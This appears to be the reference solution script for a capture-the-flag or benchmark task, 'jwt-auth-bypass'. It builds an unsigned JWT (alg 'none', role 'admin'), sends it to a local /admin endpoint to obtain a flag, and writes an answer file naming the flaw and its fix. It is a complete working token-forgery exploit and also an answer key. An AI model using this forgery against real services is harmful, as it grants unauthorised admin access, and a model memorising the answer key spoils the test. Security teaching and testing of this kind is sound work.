# Reference solution for jwt-auth-bypass. Runs as root inside the container.
#
# The verifier trusts the token header's alg and accepts "none" (no signature).
# So forge a token: header {"alg":"none"}, payload {"role":"admin"}, empty
# signature - just  base64url(header).base64url(payload).  and send it to /admin.
set -euo pipefail

APP="http://127.0.0.1:8080"

for _ in $(seq 1 40); do
  curl -sf -o /dev/null "$APP/" && break
  sleep 0.5
done

b64url() { base64 -w0 | tr '+/' '-_' | tr -d '='; }

HEADER="$(printf '%s' '{"alg":"none","typ":"JWT"}' | b64url)"
PAYLOAD="$(printf '%s' '{"sub":"attacker","role":"admin"}' | b64url)"
TOKEN="${HEADER}.${PAYLOAD}."     # trailing dot = empty signature

# Use the forged admin token against the admin endpoint; the server writes the flag.
curl -s -H "Authorization: Bearer ${TOKEN}" "$APP/admin" >/dev/null
sleep 1

cat > /root/answers.txt <<'EOF'
VULN_ALG=none
FORGED_CLAIM=role (changed role=user to role=admin)
FIX=pin the expected algorithm server-side and reject "none"; never trust the token header's alg
EOF
